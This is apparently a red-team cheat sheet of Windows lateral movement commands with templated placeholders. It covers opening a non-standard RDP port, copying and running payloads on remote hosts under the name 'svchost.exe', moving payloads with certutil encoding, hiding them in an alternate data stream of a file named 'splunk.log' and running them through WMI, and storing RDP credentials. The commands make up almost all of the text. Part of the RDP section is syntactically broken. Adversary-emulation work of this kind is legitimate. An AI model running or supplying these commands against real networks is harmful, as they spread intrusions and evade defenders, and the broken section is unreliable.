
# Lateral Movement Techniques (Windows PowerShell + CMD)

---

## 🔹 1. Change RDP Port & Allow via Firewall

**Technique:** Modify the RDP port and configure firewall rules.

```bash
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 3489
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3489
```

```bash
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3489 /f 
netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=3489
```

---

## 🔹 2. Copy and Execute File Remotely with PowerShell Job

**Technique:** Remote file copy and execution using PowerShell job and session.

```bash
$job = Start-Job -ScriptBlock {
  $username = "#{domain.user.name}";
  $password = "#{domain.user.password}";
  $secstr = New-Object -TypeName System.Security.SecureString;
  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
  $location = "#{location}";
  $exe = "#{exe_name}";
  Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
  Start-Sleep -s 5;
  Remove-PSSession -Session $session;
};
Receive-Job -Job $job -Wait;
```

---

## 🔹 3. Transfer and Execute Encoded Payload via Certutil

**Technique:** Base64 encode transfer and decode + execution remotely using `certutil`.

```bash
certutil -encode #{location} C:\users\public\com.crt | out-null
invoke-command #{remote.host.fqdn} -scriptblock {
  certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt #{location};
  invoke-wmimethod -computername . -class win32_process -name Create -argumentlist "C:\users\public\payload.exe -server #{server} -group red"
}
```

---

## 🔹 4. ADS (Alternate Data Stream) + WMI Execution

**Technique:** Transfer payload into alternate data stream, execute via WMI remotely.

```bash
esentutl.exe /y #{location} /d \\#{remote.host.fqdn}\c$\users\public\splunk.log:#{exe_name}
invoke-command #{remote.host.fqdn} -scriptblock {
  wmic process call create "C:\users\public\splunk.log:#{exe_name} -server #{server} -group red"
}
```

---

## 🔹 5. RDP with Domain Credentials and Auto Logon

**Technique:** Auto-authenticate to RDP using stored credentials.

```bash
if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};

$Server=#{logonserver}
$User = Join-Path
$Password="#{password}"
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo "RDP connection established"
```

---

## 🔹 6. Invoke Payload Remotely using PowerShell Session & Start-Job

**Technique:** Remote job execution using PSSession and credential object.

```bash
$username = "#{domain.user.name}";
$password = "#{domain.user.password}";
$secstr = New-Object -TypeName System.Security.SecureString;
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
Invoke-Command -Session $session -ScriptBlock {
  start-job -scriptblock {
    cmd.exe /c start C:\Users\Public\svchost.exe -server #{server}
  }
};
Start-Sleep -s 5;
Remove-PSSession -Session $session;
```
